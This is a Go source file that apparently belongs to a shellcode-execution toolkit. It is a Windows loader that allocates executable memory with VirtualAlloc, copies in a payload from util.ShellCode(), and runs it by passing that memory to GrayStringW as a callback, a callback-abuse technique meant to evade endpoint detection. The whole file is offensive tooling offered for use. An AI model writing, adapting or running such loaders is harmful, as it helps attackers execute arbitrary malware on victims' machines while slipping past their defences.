package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	user32 := syscall.NewLazyDLL("user32.dll")
	grayStringProc := user32.NewProc("GrayStringW")

	// 调用 GrayString
	ret, _, err := grayStringProc.Call(
		0, 0, addr, 1, 2, 3, 4, 5, 6)
	if ret == 0 {
		fmt.Println("GrayString error:", err)
	}
}

func main() {
	Run(util.ShellCode())
}
